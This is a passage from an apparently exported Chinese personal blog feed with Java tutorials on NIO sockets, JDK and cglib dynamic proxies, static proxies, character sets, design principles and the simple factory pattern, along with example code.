<h3 id="四、nio-的例子"><a href="#四、nio-的例子" class="headerlink" title="四、nio 的例子"></a>四、nio 的例子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//服务端</span><br><span class="line">public class NioServer &#123;</span><br><span class="line">    private ServerSocketChannel serverSocketChannel;</span><br><span class="line">    private Selector selector;</span><br><span class="line">    private Integer port = 8080;</span><br><span class="line"></span><br><span class="line">    NioServer() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            serverSocketChannel = ServerSocketChannel.open().bind(new InetSocketAddress(port));</span><br><span class="line">            //设置非阻塞</span><br><span class="line">            serverSocketChannel.configureBlocking(false);</span><br><span class="line">            //创建Selector</span><br><span class="line">            selector = Selector.open();</span><br><span class="line">            //注册tcp 连接事件到 channel</span><br><span class="line">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">            System.out.println(&quot;服务端初始化完成,端口号:&quot; + port);</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;初始化服务端失败,ex:&quot;+ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void start() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取查看selector 管理多少个channel</span><br><span class="line">            while (selector.select() &gt; 0) &#123;</span><br><span class="line">                //走到这里肯定是selector发现channel有变化了,这个大哥把他管理的sekectedKeys拿出来遍历</span><br><span class="line">                Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">                Iterator&lt;SelectionKey&gt; iterator = selectionKeys.iterator();</span><br><span class="line">                while (iterator.hasNext()) &#123;</span><br><span class="line">                    SelectionKey selectionKey = iterator.next();</span><br><span class="line">                    //selector 也不知道是什么变化所以就 各种判断一下,是 创建连接、还是准备就绪、还是读取数据、还是写数据、还是关闭连接</span><br><span class="line">                    if (selectionKey.isConnectable()) &#123;</span><br><span class="line">                        System.out.println(&quot;用户建立连接&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (selectionKey.isAcceptable()) &#123;</span><br><span class="line">                        System.out.println(&quot;用户准备就绪&quot;);</span><br><span class="line">                        ServerSocketChannel serverSocketChannel = (ServerSocketChannel) selectionKey.channel();</span><br><span class="line">                        //这样就拿到了发生变化的 socketChannel</span><br><span class="line"></span><br><span class="line">                        SocketChannel accept = serverSocketChannel.accept();</span><br><span class="line">                        accept.configureBlocking(false);</span><br><span class="line">                        //把客户端的channel 注册到 selector 当客户端的socketChannel发生变化出发读逻辑</span><br><span class="line">                        accept.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (selectionKey.isReadable()) &#123;</span><br><span class="line">                        System.out.println(&quot;读数据&quot;);</span><br><span class="line">                        SocketChannel socketChannel = (SocketChannel) selectionKey.channel();</span><br><span class="line">                        //读数据得是由buffer</span><br><span class="line">                        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);</span><br><span class="line">                        //切换到读模式</span><br><span class="line">                        StringBuffer sb = new StringBuffer();</span><br><span class="line">                        while (socketChannel.read(byteBuffer) != -1) &#123;</span><br><span class="line">                            byteBuffer.flip();</span><br><span class="line">                            sb.append(StandardCharsets.UTF_8.decode(byteBuffer));</span><br><span class="line">                            byteBuffer.clear();</span><br><span class="line">                        &#125;</span><br><span class="line">                        System.out.println(&quot;来自客户端的问候:&quot; + sb.toString());</span><br><span class="line">                        //来个写数据吧</span><br><span class="line">                        socketChannel.register(selector,SelectionKey.OP_WRITE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (selectionKey.isWritable()) &#123;</span><br><span class="line">                        System.out.println(&quot;写数据&quot;);</span><br><span class="line">                        System.out.println(&quot;不会写数据&quot;);</span><br><span class="line">                        selectionKey.channel().close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (selectionKey.isValid()) &#123;</span><br><span class="line">                        System.out.println(&quot;关闭数据&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    //把当前的selection移除,因为后面事件还会加入</span><br><span class="line">                    iterator.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;服务异,ex:&quot;, ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //先定义服务端</span><br><span class="line">        NioServer nioServer = new NioServer();</span><br><span class="line">        //开启服务</span><br><span class="line">        nioServer.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//客户端</span><br><span class="line">public class NioClint &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        SocketChannel open = SocketChannel.open();</span><br><span class="line">        open.connect(new InetSocketAddress(&quot;127.0.0.1&quot;,8080));</span><br><span class="line">        open.configureBlocking(false);</span><br><span class="line">        ByteBuffer byteBuffer =ByteBuffer.allocate(1024);</span><br><span class="line">        byteBuffer.flip();</span><br><span class="line">        String msg =&quot;呵呵,你大爷&quot;;</span><br><span class="line">        byteBuffer = ByteBuffer.wrap(msg.getBytes(&quot;utf-8&quot;));</span><br><span class="line">        open.write(byteBuffer);</span><br><span class="line">        byteBuffer.clear();</span><br><span class="line">        Socket socket = open.socket();</span><br><span class="line">        SocketChannel channel = socket.getChannel();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识 动态代理 jdk代理</title>
    <url>//2020/06/15/java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-jdk%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="一、jdk动态代理"><a href="#一、jdk动态代理" class="headerlink" title="一、jdk动态代理"></a>一、jdk动态代理</h3><p>动态代理分为jdk动态代理和cglib动态代理,本章讲解jdk动态代理</p>
<h3 id="二、jdk动态代理如何实现"><a href="#二、jdk动态代理如何实现" class="headerlink" title="二、jdk动态代理如何实现"></a>二、jdk动态代理如何实现</h3><ol>
<li>实现InvorcationHander接口,在invoke()方法实现增强</li>
<li>通过Proxy.newProxyInstance()方法获取到代理类</li>
<li>调用代理引用调用目标方法实现曾江</li>
</ol>
<h3 id="三、代码实现"><a href="#三、代码实现" class="headerlink" title="三、代码实现"></a>三、代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        final Car car = new BmwCar();</span><br><span class="line">        Car carProxy = (Car) Proxy.newProxyInstance(Car.class.getClassLoader(), car.getClass().getInterfaces(), new InvocationHandler() &#123;</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                System.out.println(&quot;增强前&quot;);</span><br><span class="line">                Object invoke = method.invoke(car, args);</span><br><span class="line">                System.out.println(&quot;增强后&quot;);</span><br><span class="line">                return invoke;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        carProxy.run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-bd78b9420f1948c1a40d2296a963968d.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="四、实现原理"><a href="#四、实现原理" class="headerlink" title="四、实现原理"></a>四、实现原理</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-662f7405a32640d18fc980a2cfa0f0a5.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-5655df9945ac46fbbdfcc732096d9617.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-26944ac2f4124595a0488f9839f89d05.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 4 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-a1db2b12ab37483881d89a6ef1738e0f.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 5 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>可以看到通过Proxy.newProxyInstance()生成了目标对象的代理类,以二进制的方式加载到了内存中.<br>那么代理类长什么样子呢？\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-e76f3aae567d4aeb8f3e6d1b5f07bfc2.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 6 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<ol>
<li>代理类继承了Proxy类并且实现了我们的car接口</li>
<li>在实现的run方法中,调用了h.invoke()方法</li>
<li>那么h是什么呢？ h是 Proxy类中的属性,就是InvoketionHander接口的引用,所以jdk代理类必须实现InvoketionHander接口\<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-5dd41bac7c5244c895bf1b375ff8db00.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 7 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<br>jdk 动态代理实现图\<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-29ce1ec01db5495c8101137d1bc51028.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 8 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识 静态代理</title>
    <url>//2020/06/11/%20java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="一、什么是代理模式"><a href="#一、什么是代理模式" class="headerlink" title="一、什么是代理模式"></a>一、什么是代理模式</h3><ul>
<li>定义<br>给目标对象提供一个代理对象,由代理对象操作目标对象的引用。</li>
<li>目的<br>通过操作代理对象,操作目标对象,降低程序的复杂性,可以使用代理类实现目标对象的增强。不改变目标对象实现功能则增加。代理模式的结构图</li>
</ul>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-c4b34c32767f4621a2cfc188a670c1fa.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">bwmcar--&gt;car</span><br><span class="line">bwmcar--&gt;bwmproxy</span><br><span class="line">bwmproxy--&gt;car</span><br></pre></td></tr></table></figure>

<h3 id="二、java实现"><a href="#二、java实现" class="headerlink" title="二、java实现"></a>二、java实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个接口</span><br><span class="line">public interface Car &#123;</span><br><span class="line">    public void run() ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义宝马车实现类</span><br><span class="line">public class BmwCar implements Car &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        System.out.println(&quot;我是一个宝马车&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义宝马车实现类</span><br><span class="line">public class BmwCarProxy implements Car &#123;</span><br><span class="line">    //代理类拥有目标对象的引用</span><br><span class="line">    private BmwCar bmwCar;</span><br><span class="line"></span><br><span class="line">    public void proxy(BmwCar bmwCar) &#123;</span><br><span class="line">        this.bmwCar = bmwCar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        System.out.println(&quot;增强前&quot;);</span><br><span class="line">        bmwCar.run();</span><br><span class="line">        System.out.println(&quot;增强后&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">       BmwCar bmwCar =new BmwCar();</span><br><span class="line">       BmwCarProxy proxy =new BmwCarProxy();</span><br><span class="line">       proxy.proxy(bmwCar);</span><br><span class="line"> //调用代理类的方法</span><br><span class="line">     proxy.run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-a5e40f4c878a462e84697245290394f1.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><ol>
<li>静态代理模式可以在不改变目标对象的前提下,对目标对象实现方法的增加</li>
<li>每次增加增强方法都需要修改代码,违反开闭原则,扩展能力可维护性查</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>静态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识 字符集</title>
    <url>//2020/05/25/%20java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9-%E5%AD%97%E7%AC%A6%E9%9B%86md/</url>
    <content><![CDATA[<h3 id="字符集相关概念"><a href="#字符集相关概念" class="headerlink" title="字符集相关概念"></a>字符集相关概念</h3><p>编码： 字符串-&gt;字节数组</p>
<p>解码：字节数组-&gt;字符串</p>
<h3 id="相关字符集介绍"><a href="#相关字符集介绍" class="headerlink" title="相关字符集介绍"></a>相关字符集介绍</h3><ul>
<li><p>ASCII (american standard code for information interchange 美国信息交换标准代码)7 bit 表示来表示一个字符，共计可以表示128中字符</p>
</li>
<li><p>Ios-8859-1 8 bit 表示一个字符 ，即使用一个字节 8 bit表示一个字符 共计可以表示 256个字符</p>
</li>
<li><p>Gb2312 2个字节表示一个汉字</p>
</li>
<li><p>Gbk 对 Gb2312的扩展 支持生僻字</p>
</li>
<li><p>Gb18030 表示汉字最多的</p>
</li>
<li><p>Big5 繁体中文</p>
</li>
<li><p>Unicode 最广泛的编码，两个字节表示一个字符 包含全球所有文字</p>
</li>
</ul>
<p>缺点 ： 存储空间会变大(英文国家)</p>
<ul>
<li><p>Utf unicode是一个编码方式，而utf是一个存储方式 utf-8 是unicode的实现方式之一</p>
</li>
<li><p>Utf-16LE(小端) UTF16BE(大端)</p>
<p>文件起始位置 0xFEFF (BE) 0XFFFE(LE)</p>
</li>
<li><p>Utf-8 变长字节表示形式</p>
</li>
</ul>
<p>一般来说，utf-8 会通过3个字节表示一个中文</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>字符集</tag>
        <tag>utf-8</tag>
      </tags>
  </entry>
  <entry>
    <title>java 基础知识 动态代理 cglib代理</title>
    <url>//2020/06/25/java%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-cglib%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="一、cglib代理介绍"><a href="#一、cglib代理介绍" class="headerlink" title="一、cglib代理介绍"></a>一、cglib代理介绍</h3><p>cglib代理是实现动态代理的另一种方式,CGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。通常可以使用Java的动态代理创建代理，但当要代理的类没有实现接口或者为了更好的性能，CGLIB是一个好的选择</p>
<h3 id="二、cglib的原理"><a href="#二、cglib的原理" class="headerlink" title="二、cglib的原理"></a>二、cglib的原理</h3><ol>
<li>动态生成目标类的代理类,重写代理类的所有非final修饰的方法,子类使用方法拦截的方式实现目标类的增强,所以cglib代理比jdk反射代理效率更高,并且能代理类,而jdk代理只能代理接口</li>
<li>底层使用asm字节码框架生成代理类,而不是使用反射生成类</li>
<li>缺点不能代理被final修饰的方法</li>
</ol>
<h3 id="三、cglib代理的实现"><a href="#三、cglib代理的实现" class="headerlink" title="三、cglib代理的实现"></a>三、cglib代理的实现</h3><pre><code>public static void main(String[] args) {
     System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, &quot;resource&quot;);
     Dog dog =new Dog();
     Enhancer enhancer =new Enhancer();
     //设置目前类
     enhancer.setSuperclass(Dog.class);
     //设置拦截器
     enhancer.setCallback(new MethodInterceptor() {
         public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {
             System.out.println(&quot;呵呵,我是增强&quot;);
             return  methodProxy.invokeSuper(o,objects);
         }
     });
     Dog dogProxy = (Dog) enhancer.create();
     dogProxy.run();
 }
</code></pre>
<h3 id="四、invokeSuper-方法"><a href="#四、invokeSuper-方法" class="headerlink" title="四、invokeSuper()方法"></a>四、invokeSuper()方法</h3><p>因为cglib代理是继承目标类,并且重写方法,所以这里调用invokesuper方法,调用父类的方法</p>
<h3 id="五、cglib原理"><a href="#五、cglib原理" class="headerlink" title="五、cglib原理"></a>五、cglib原理</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-9d6ebe185caf41dabf565fc34cf4261e.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>上图可以看到cglib方式会在内存中生成,3个字节码文件.可以使用 System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, “resource”);方法将字节码文件写到相关目录。</p>
<ol>
<li>可以看到代理类实现了目标代理类\<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-c8f1d330468b43cf8c7c366de820eb60.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
<li>可以看到重写run方法,先回去回调方法,如果获取不到就加载回调方法,执行intercept 方法\<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-b8c6e2ef41bf4aae9d284e0917377c86.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
<li>FastClass机制<br>FastClass提出了index下标的概念,通过index保存方法的引用信息,将反射调用转化为方法的直接调用,体现所谓的fast\<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-9d8363bf512c4056b006d7b3180fae63.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 4 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
<li>通过方法名计算hashcode值,通过hashcode找到方法对应的index</li>
<li>通过index 调用invoke方法,invoke方法通过index判断执行那个方法</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>动态代理类通过实现invocationHandler接口</li>
<li>通过<br>Proxy.newProxyInstance(factory.getClass().getClassLoader(),person.getClass().getInterfaces(),this)方法<br>复制一份代理的类并且生成字节码文件到内存中,<br>生成的代理类 继承了Proxy类 并且实现了代理接口<br>调用生成的动态代理类中实现的方法,其中调用了其实现的方法，在方法中通过invocationHandler的invoke()方法<br>jdk动态代理的缺点 不能代理类,需要实现invocationHandler接口<br>jdk动态代理和cglib生成字节码的方式不通</li>
<li>cglib动态代理 可以动态代理类<br>因为cglib动态生成的类是继承原类,所以可以动态代理到类</li>
<li>jdk动态代理实现了自己的顶层接口继承了proxy类</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 七大设计原则</title>
    <url>//2020/06/29/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20%E4%B8%83%E5%A4%A7%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>下面是我对7大设计原则自己的理解</p>
<ul>
<li>单一原则<br>一个类只做一件事情</li>
<li>里氏替换原则<br>1.合理继承<br>2.继承 子类是为了扩展父类,而不是重写相关方法。</li>
<li>依赖倒置原则<br>高模块不应该直接依赖低模块,而是应该依赖其抽象</li>
<li>开闭原则<br>对扩展开放,对修改关闭</li>
<li>迪莱米原则<br>一个类引用类一个类,被引用类应该尽可能的封装自己的属性和方法,让别的类知道的越少越好</li>
<li>组合复合原则<br>不推荐使用继承,可以使用组合的方式进行实现</li>
<li>接口隔离原则<br>一个类对于另一个类的依赖,应该建立在最小的接口上,使用接口隔离</li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式 创建型模式 简单工厂模式</title>
    <url>//2020/07/11/%E3%80%90%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F%E3%80%91%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>简单工厂模式又叫静态工厂模式,是属于创建型模式,工厂方法通过参数来控制创建不通的对象,这些对象都继承同一个夫类。</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1585579314830.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CarFactory &#123;</span><br><span class="line"></span><br><span class="line">    public static Car getCar(String name) &#123;</span><br><span class="line">        if (&quot;BMW&quot;.equals(name)) &#123;</span><br><span class="line">            return new BMWCar();</span><br><span class="line">        &#125;</span><br><span class="line">        if (&quot;BAOJUN&quot;.equals(name)) &#123;</span><br><span class="line">            return new BaojunCar();</span><br><span class="line">        &#125;</span><br><span class="line">        throw new RuntimeException(&quot;unsupport car name &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Car &#123;</span><br><span class="line">    void desc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BMWCar implements Car &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;我是宝马～&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BaojunCar implements Car &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void desc() &#123;</span><br><span class="line">        System.out.println(&quot;我是宝骏！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>产品类（宝马、宝骏）都继承Car类</p>
</li>
<li><p>工厂类根据入参不同返回不通的产品<br>下面是主方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Car bmw = CarFactory.getCar(&quot;BMW&quot;);</span><br><span class="line">        bmw.desc();</span><br><span class="line">        Car baojun = CarFactory.getCar(&quot;BAOJUN&quot;);</span><br><span class="line">        baojun.desc();</span><br><span class="line">        Car xxx = CarFactory.getCar(&quot;xxx&quot;);</span><br><span class="line">        xxx.desc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image_1585578451696.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
</ol>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul>
<li>通过入参控制返回不同的产品,隐藏生成产品的逻辑,调用方属于消费者</li>
<li>调用方只需要记录相关类的参数即可创建对应的类,避免了创建类名复杂,不好记忆的问题</li>
<li>相关参数可以放到配置文件中,一定成都上增加了灵活性</li>
</ul>
<h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul>
<li>所有的类创建都在工厂类创建,一但工厂类发生问题所有的产品的创建都受到影响</li>
<li>扩展性差,如果增加新的产品需要在工厂类增加代码,导致工厂类过于复杂且庞大</li>
